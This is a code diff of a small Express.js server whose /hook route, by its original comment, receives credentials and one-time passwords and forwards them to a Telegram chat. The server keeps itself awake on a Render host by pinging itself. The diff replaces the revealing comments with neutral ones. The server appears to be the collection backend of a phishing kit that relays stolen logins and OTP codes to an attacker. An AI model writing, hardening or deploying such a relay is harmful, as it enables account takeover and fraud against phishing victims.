@@ -6,19 +6,24 @@ const cors = require("cors");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram bot details
+// Soma env vars
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
+
+if (!botToken || !chatId) {
+  console.error("BOT_TOKEN or CHAT_ID is missing in environment variables!");
+  process.exit(1); // stop server kama env hazipo
+}
 
 app.use(cors());
 app.use(bodyParser.json());
 
-// Default route for keep alive (for cron-job.org ping)
+// Keep alive route
 app.get("/", (req, res) => {
   res.send("Server is alive!");
 });
 
-// Hook route to receive credentials and OTP
+// Telegram send route
 app.post("/hook", async (req, res) => {
   const data = req.body;
 
@@ -43,7 +48,7 @@ app.post("/hook", async (req, res) => {
   }
 });
 
-// Keep server awake by pinging itself every 14 minutes
+// Self-ping to keep server awake
 setInterval(() => {
   axios.get("https://web-server-ee1r.onrender.com/")
     .then(() => console.log("Self-ping successful"))
